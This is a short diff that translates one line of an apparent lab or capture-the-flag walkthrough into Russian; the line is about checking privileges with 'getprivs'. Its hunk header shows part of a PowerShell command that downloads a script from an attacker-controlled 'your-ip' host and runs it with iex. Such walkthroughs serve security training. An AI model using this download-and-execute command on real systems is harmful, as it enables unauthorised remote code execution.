@@ -104,7 +104,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-po
 
 <img src="https://i.imgur.com/YF8AsSf.png"/>
 
-Running the command `getprivs` we can see what privileges we have on the machine
+Выполнив команду `getprivs`, мы можем увидеть, какие привилегии у нас есть на компьютере
 
 <img src="https://i.imgur.com/zaqoz9K.png"/>
 
